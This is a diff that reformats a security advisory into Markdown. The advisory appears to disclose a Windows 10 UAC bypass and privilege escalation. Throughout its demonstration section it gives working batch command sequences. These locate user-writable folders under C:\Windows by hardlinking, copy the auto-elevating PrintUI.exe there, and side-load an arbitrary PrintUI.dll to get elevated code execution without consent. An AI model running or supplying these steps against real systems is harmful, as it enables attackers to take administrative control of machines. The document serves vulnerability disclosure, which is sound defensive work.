@@ -26,28 +26,31 @@ administrative rights in several (user-writable) directories below
 C:\Windows: in the account created during Windows setup without UAC
 prompt, in (unprivileged) standard user accounts with (blue) UAC prompt!
 
-CVSS 3.0 score: 8.2 (High)
-CVSS 3.0 vector: 3.0/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H
+### CVSS 3.0 score: 8.2 (High)
+### CVSS 3.0 vector: 3.0/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H
 
 
-Demonstration
-~~~~~~~~~~~~~
+# Demonstration
+# ~~~~~~~~~~~~~
 
 1. Log on to an arbitrary unprivileged (standard) user account and start
    the command processor, then run the following command lines to detect
    the user-writable directories below %SystemRoot%\ through creation of
    a hardlink named WRITABLE.EXE and collect their pathnames in the file
    %ProgramData%\WRITABLE.LOG:
-
+   
+```
    COPY /Y NUL: "%ProgramData%\WRITABLE.LOG" && (
    DIR "%SystemRoot%" /A:D /B /S 1>"%ProgramData%\WRITABLE.TMP" && (
    FOR /F "Delims= UseBackQ" %? IN ("%ProgramData%\WRITABLE.TMP") DO @(
    MKLINK /H "%~?\WRITABLE.EXE" "%ProgramData%\WRITABLE.LOG" 2>NUL: && 1>>"%ProgramData%\WRITABLE.LOG" ECHO %~?))
    TYPE "%ProgramData%\WRITABLE.LOG")
+```   
 
    On fresh installations of Windows 10 2004/20H1/20H2 for AMD64 alias
    x64 processors this yields the following pathnames:
 
+```
    C:\Windows\Tasks
    C:\Windows\Temp
    C:\Windows\tracing
@@ -62,15 +65,19 @@ Demonstration
    C:\Windows\SysWOW64\FxsTmp
    C:\Windows\SysWOW64\Tasks
    C:\Windows\SysWOW64\Com\dmp
+```   
 
    On installations which were upgraded to (any version of) Windows 10,
    the following additional pathname is typically listed:
-
+   
+```
    C:\Windows\System32\Tasks_Migrated
+```   
 
    On installations which have been used for some time, the following
    additional pathnames are typically listed:
-
+   
+```
    C:\Windows\debug\WIA
    C:\Windows\PLA\Reports
    C:\Windows\PLA\Rules
@@ -87,20 +94,22 @@ Demonstration
    C:\Windows\PLA\Rules\ru-RU
    C:\Windows\System32\catroot2\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}
    C:\Windows\System32\LogFiles\WMI
-
+```
 
 2. Let's see whether the hardlinks WRITABLE.EXE can be (ab)used: copy an
    arbitrary executable to all of them and execute it.
 
    JFTR: PrintUI.exe is one of the 63+ applications which have UAC auto-
          elevation enabled.
-
+       
+```
    SETLOCAL ENABLEDELAYEDEXPANSION
    COPY /Y "%ProgramData%\WRITABLE.LOG" "%ProgramData%\WRITABLE.TMP" && (
    COPY /Y "%SystemRoot%\System32\PrintUI.exe" "%ProgramData%\WRITABLE.LOG" && (
    FOR /F "Delims= UseBackQ" %? IN ("%ProgramData%\WRITABLE.TMP") DO (
    START "" /WAIT "%~?\WRITABLE.EXE"
    ECHO !ERRORLEVEL!)))
+```   
 
    In unprivileged (standard) user accounts this triggers an UAC prompt
    for each file executed, some yellow, showing "Publisher: Unknown",
@@ -109,14 +118,17 @@ Demonstration
    After giving consent to the UAC prompt a dialog box showing usage
    instructions for PrintUI.dll is displayed, indicating that (the copy
    of) PrintUI.exe loads PrintUI.dll:
-
+   
+```
    | Usage: rundll32 printui.dll,PrintUIEntry [options] [@commandfile]
+```   
 
    JFTR: since PrintUI.exe runs elevated, PrintUI.dll runs elevated too!
 
 
 3. Let's verify the Authenticode signature of the copy of PrintUI.exe:
 
+```
    SignTool.exe VERIFY /A /V "%ProgramData%\WRITABLE.LOG"
 
    | Verifying: C:\ProgramData\WRITABLE.LOG
@@ -125,6 +137,7 @@ Demonstration
    ...
    | Successfully verified: C:\ProgramData\WRITABLE.LOG
    ...
+```
 
    Authenticode doesn't care about the path/filename of signed executables,
    even for files with detached signatures, although the *.CAT files used
@@ -146,10 +159,12 @@ Demonstration
          alias STATUS_DLL_INIT_FAILED, and lets LoadLibrary() fail with the
          Win32 error 1114 alias ERROR_DLL_INIT_FAILED
 
+```
    COPY "%SystemRoot%\System32\ShUnimpl.dll" "%ProgramData%\PrintUI.dll"
    RENAME "%ProgramData%\WRITABLE.LOG" PrintUI.exe
    START "" /WAIT "%ProgramData%\PrintUI.exe"
    CERTUTIL.exe /ERROR %ERRORLEVEL%
+```
 
    OUCH: (the copy of) PrintUI.exe loads an arbitrary PrintUI.dll from its
          application directory instead of %SystemRoot%\System32\PrintUI.dll
@@ -180,11 +195,14 @@ Demonstration
    account created during Windows setup, start an UNELEVATED (unprivileged)
    command prompt and run the following command lines:
 
+```
    SETLOCAL ENABLEDELAYEDEXPANSION
    FOR /F "Delims= UseBackQ" %? IN ("%ProgramData%\WRITABLE.TMP") DO (
    MKLINK /H "%~?\PrintUI.dll" "%ProgramData%\PrintUI.dll" && (
    START "" /WAIT "%~?\WRITABLE.EXE"
    ECHO !ERRORLEVEL!))
+
+```
 
    BINGO: GAME OVER!
 
